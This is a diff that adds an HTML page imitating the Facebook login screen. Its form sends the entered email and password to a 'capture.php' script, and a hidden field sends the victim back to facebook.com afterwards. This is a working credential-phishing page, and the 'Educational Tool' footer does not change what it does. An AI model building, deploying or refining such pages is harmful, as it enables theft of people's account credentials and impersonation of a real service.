@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; }
+        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); width: 396px; }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo h1 { color: #1877f2; font-size: 48px; font-weight: bold; }
+        .tagline { text-align: center; color: #606770; font-size: 24px; margin-bottom: 20px; }
+        .form-group { margin-bottom: 12px; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
+        input[type="text"]:focus, input[type="password"]:focus { border-color: #1877f2; outline: none; }
+        .login-btn { width: 100%; background: #1877f2; color: white; padding: 14px; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin: 12px 0; }
+        .login-btn:hover { background: #166fe5; }
+        .forgot-password { text-align: center; margin: 16px 0; }
+        .forgot-password a { color: #1877f2; text-decoration: none; font-size: 14px; }
+        .divider { border-top: 1px solid #dadde1; margin: 20px 0; }
+        .create-account { text-align: center; }
+        .create-btn { background: #42b883; color: white; padding: 12px 24px; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
+        .create-btn:hover { background: #369870; }
+        .footer { text-align: center; margin-top: 20px; color: #8a8d91; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <h1>facebook</h1>
+            </div>
+            <div class="tagline">Connect with friends and the world around you on Facebook.</div>
+            
+            <form method="POST" action="capture.php">
+                <input type="hidden" name="redirect_url" value="https://facebook.com">
+                <div class="form-group">
+                    <input type="text" name="email" placeholder="Email or phone number" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            
+            <div class="forgot-password">
+                <a href="#">Forgotten password?</a>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <div class="create-account">
+                <button class="create-btn">Create New Account</button>
+            </div>
+            
+            <div class="footer">
+                <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
